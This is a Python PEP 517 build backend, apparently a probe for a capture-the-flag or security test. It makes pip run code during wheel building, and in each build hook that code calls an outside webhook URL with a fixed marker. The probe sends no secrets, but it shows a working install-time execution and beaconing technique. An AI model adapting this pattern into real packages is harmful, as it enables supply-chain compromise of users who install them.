"""Minimal PEP 517 backend for an authorized, harmless execution probe.

It sends only a fixed marker to the user's supplied webhook URL. It does not
read environment variables, files, credentials, or other challenge data.
"""
import base64
import csv
import hashlib
import io
import os
import urllib.request
import zipfile

WEBHOOK = "https://webhook.site/cee81ba7-4223-4f5b-b95e-99d20c771c33"
MARKER = "evilpip-pep517-backend-executed"


def _notify():
    try:
        req = urllib.request.Request(
            WEBHOOK + "?marker=" + MARKER,
            headers={"User-Agent": "evilpip-authorized-diagnostic/1.0"},
            method="GET",
        )
        with urllib.request.urlopen(req, timeout=3) as response:
            response.read(64)
    except Exception:
        # Network egress may be disabled; the build probe should still proceed.
        pass


def get_requires_for_build_wheel(config_settings=None):
    _notify()
    return []


def prepare_metadata_for_build_wheel(metadata_directory, config_settings=None):
    _notify()
    dist_info = os.path.join(metadata_directory, "evilpip_probe-0.0.1.dist-info")
    os.makedirs(dist_info, exist_ok=True)
    with open(os.path.join(dist_info, "METADATA"), "w", encoding="utf-8") as f:
        f.write("Metadata-Version: 2.1\nName: evilpip-probe\nVersion: 0.0.1\n\n")
    with open(os.path.join(dist_info, "WHEEL"), "w", encoding="utf-8") as f:
        f.write("Wheel-Version: 1.0\nGenerator: evilpip-probe\nRoot-Is-Purelib: true\nTag: py3-none-any\n")
    return "evilpip_probe-0.0.1.dist-info"


def build_wheel(wheel_directory, config_settings=None, metadata_directory=None):
    _notify()
    filename = "evilpip_probe-0.0.1-py3-none-any.whl"
    entries = {
        "evilpip_probe/__init__.py": '"""Harmless Evil Pip diagnostic package."""\n',
        "evilpip_probe-0.0.1.dist-info/METADATA":
            "Metadata-Version: 2.1\nName: evilpip-probe\nVersion: 0.0.1\n\n",
        "evilpip_probe-0.0.1.dist-info/WHEEL":
            "Wheel-Version: 1.0\nGenerator: evilpip-probe\nRoot-Is-Purelib: true\nTag: py3-none-any\n",
    }
    record_name = "evilpip_probe-0.0.1.dist-info/RECORD"
    output = os.path.join(wheel_directory, filename)
    os.makedirs(wheel_directory, exist_ok=True)
    with zipfile.ZipFile(output, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for name, content in entries.items():
            zf.writestr(name, content)
        rows = []
        for name, content in entries.items():
            raw = content.encode("utf-8")
            digest = base64.urlsafe_b64encode(hashlib.sha256(raw).digest()).rstrip(b"=").decode("ascii")
            rows.append((name, "sha256=" + digest, str(len(raw))))
        rows.append((record_name, "", ""))
        buf = io.StringIO()
        writer = csv.writer(buf, lineterminator="\n")
        writer.writerows(rows)
        zf.writestr(record_name, buf.getvalue())
    return filename
